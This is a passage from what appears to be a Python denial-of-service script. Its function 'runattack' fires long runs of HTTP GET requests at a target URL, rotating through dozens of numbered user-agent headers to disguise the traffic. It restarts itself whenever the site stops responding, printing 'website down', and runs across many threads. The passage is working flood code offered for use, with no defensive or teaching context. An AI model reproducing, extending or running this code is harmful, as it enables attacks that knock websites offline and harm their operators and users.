				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok38)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok39)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok40)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok41)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok42)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok43)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok44)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok45)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok46)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok47)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok48)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok49)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok50)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok51)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok52)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok53)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok54)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok55)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok56)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok57)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok58)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok59)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok60)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok61)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok62)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok63)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok64)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok65)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok66)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok67)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok68)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok69)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok70)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok71)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok72)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok73)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok74)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok75)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok76)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok77)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok78)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok79)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok80)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok81)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok82)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok83)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok84)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok85)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok86)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok87)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok88)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok89)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok90)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok91)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok92)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok93)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok94)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok95)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok96)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok97)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok98)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok99)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok100)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok101)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok102)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok103)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok104)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok105)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok106)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok107)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok108)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok109)
				print("[==request sended==]")	
				time.sleep(sleepbot)
				gc.collect()
			except Exception as e:
				print("[==website down==]")
				time.sleep(2)
				gc.collect()
				runattack()
		for i in range(threads):
			tr = threading.Thread(target=runattack)
			tr.start()
else:
	os.system("Have a good day!")
	os.system("color 7")
	quit()
